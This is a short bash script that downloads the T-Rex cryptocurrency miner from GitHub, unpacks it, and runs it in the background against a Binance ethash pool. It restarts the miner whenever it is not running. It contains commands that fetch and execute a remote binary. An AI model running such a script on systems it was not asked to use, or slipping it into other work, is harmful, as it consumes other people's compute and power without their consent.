#!/bin/bash
woker=$(date +'%d%m_%H%M%S_')
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/B8648rns22.txt" ]; then
	echo "Start setup..."
	echo "B8648rns22" > B8648rns22.txt
	wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
	./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u logistic -p x -w $woker &
else
	if pgrep t-rex >/dev/null 2>&1
	then
		echo "RUNNING"
	else
		wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz
    		./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u logistic -p x -w $woker &
	fi
fi
